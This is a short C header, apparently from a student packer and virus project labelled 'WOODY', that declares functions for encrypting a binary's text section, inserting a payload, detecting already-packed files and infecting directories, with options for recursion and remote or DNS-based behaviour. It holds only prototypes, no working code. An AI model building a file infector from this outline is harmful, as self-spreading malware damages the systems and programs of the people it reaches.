#ifndef INFECT_H
# define INFECT_H

# include <stdint.h>
# include <stddef.h>

extern char key[16];

//======================= WOODY ==============================

void encrypt_block(uint32_t* v, uint32_t *k);
void encrypt(char *s, uint64_t n, uint32_t *k);
int encrypt_text_section(char *s, size_t n);

//=============================================================

static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2);
static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add);
static int _prepare(char **s, size_t *n, char *b, size_t bn);

//=============================================================

int check_already_packed(char *s, size_t n, size_t virus_len);

typedef struct s_opt {
	char do_recur;
	char do_remote;
	char do_dns_remote;
	char print_msg;
} Opt;

int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt);
int check_prop(char *programe_name);

#endif
